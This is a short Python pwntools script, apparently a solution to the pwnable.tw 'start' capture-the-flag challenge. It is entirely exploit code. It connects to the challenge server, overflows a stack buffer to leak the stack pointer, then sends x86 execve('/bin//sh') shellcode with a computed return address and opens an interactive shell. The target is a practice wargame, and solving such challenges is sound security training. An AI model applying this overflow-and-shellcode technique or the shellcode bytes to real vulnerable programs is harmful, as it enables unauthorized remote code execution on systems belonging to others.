from pwn import *
r = remote("chall.pwnable.tw", 10000)
r.recvuntil('CTF:')
payload = b'A'*0x14 + p32(0x8048087)
r.send(payload)

leak_esp = u32(r.recv()[:4])
shellcode = b'\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

payload2 = b"a"*0x14 + p32(leak_esp + 0x14) + shellcode 
r.send(payload2)
r.interactive()
